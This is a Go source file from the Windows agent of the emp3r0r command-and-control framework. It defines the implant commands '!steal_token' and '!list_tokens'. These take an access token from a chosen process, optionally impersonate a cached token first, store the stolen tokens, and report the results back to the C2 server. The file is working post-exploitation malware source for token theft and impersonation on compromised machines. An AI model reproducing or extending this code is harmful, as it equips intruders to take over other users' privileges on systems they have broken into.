//go:build windows

package handler

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/priv"
	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"github.com/spf13/cobra"
	"golang.org/x/sys/windows"
)

func platformCommands(cmd *cobra.Command) {
	// !steal_token
	stealTokenCmd := &cobra.Command{
		Use:     def.C2CmdStealToken,
		Short:   "Steal token from process; store in memory for future use",
		Example: fmt.Sprintf("%s --pid <pid> [--token <sid>]", def.C2CmdStealToken),
		GroupID: "windows",
		Run:     runStealToken,
	}
	stealTokenCmd.Flags().StringP("pid", "", "", "PID of the process to steal token from")
	stealTokenCmd.Flags().StringP("token", "", "", "SID of an existing cached token to impersonate before stealing")
	cmd.AddCommand(stealTokenCmd)

	// !list_tokens
	listTokensCmd := &cobra.Command{
		Use:     def.C2CmdListTokens,
		Short:   "List all cached impersonation tokens with friendly names",
		Example: def.C2CmdListTokens,
		GroupID: "windows",
		Run:     runListTokens,
	}
	cmd.AddCommand(listTokensCmd)
}

func runStealToken(cmd *cobra.Command, args []string) {
	pidStr, _ := cmd.Flags().GetString("pid")
	if pidStr == "" {
		c2transport.NotifyC2(cmd, "Error: args error: PID is required: %s", args)
		return
	}
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: args error: PID is invalid: %s", args)
		return
	}

	// If an existing token SID is provided, pass its handle to StealToken
	// so it can impersonate before opening the target process.
	tokenSID, _ := cmd.Flags().GetString("token")
	var hExisting windows.Handle
	if tokenSID != "" {
		raw, ok := priv.TokenMap.Load(tokenSID)
		if !ok {
			c2transport.NotifyC2(cmd, "Error: token not found for SID %q", tokenSID)
			return
		}
		var ok2 bool
		hExisting, ok2 = raw.(windows.Handle)
		if !ok2 {
			c2transport.NotifyC2(cmd, "Error: invalid token handle for SID %q", tokenSID)
			return
		}
	}

	hToken, err := priv.StealToken(syscall.RuntimeSyscallTable, uint32(pid), hExisting)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	sid, err := priv.GetTokenUserSid(hToken)
	if err != nil {
		c2transport.NotifyC2(cmd, "%s", err.Error())
		return
	}
	priv.TokenMap.Store(sid, hToken)
	friendly := priv.GetTokenFriendlyName(hToken)
	c2transport.NotifyC2(cmd, "Successfully stole token for %s", friendly)
}

func runListTokens(cmd *cobra.Command, _ []string) {
	var entries []string
	priv.TokenMap.Range(func(key, value any) bool {
		sid, ok := key.(string)
		if !ok {
			return true
		}
		hToken, ok := value.(windows.Handle)
		if !ok {
			entries = append(entries, fmt.Sprintf("%s  <invalid handle>", sid))
			return true
		}
		friendly := priv.GetTokenFriendlyName(hToken)
		// Output SID first so the CC-side completer can use it directly
		entries = append(entries, fmt.Sprintf("%s  %s", sid, friendly))
		return true
	})

	if len(entries) == 0 {
		c2transport.NotifyC2(cmd, "No cached tokens (run: %s --pid <PID>)\n", "!steal_token")
		return
	}
	c2transport.NotifyC2(cmd, "Cached tokens (%d):\n%s\n", len(entries), strings.Join(entries, "\n"))
}
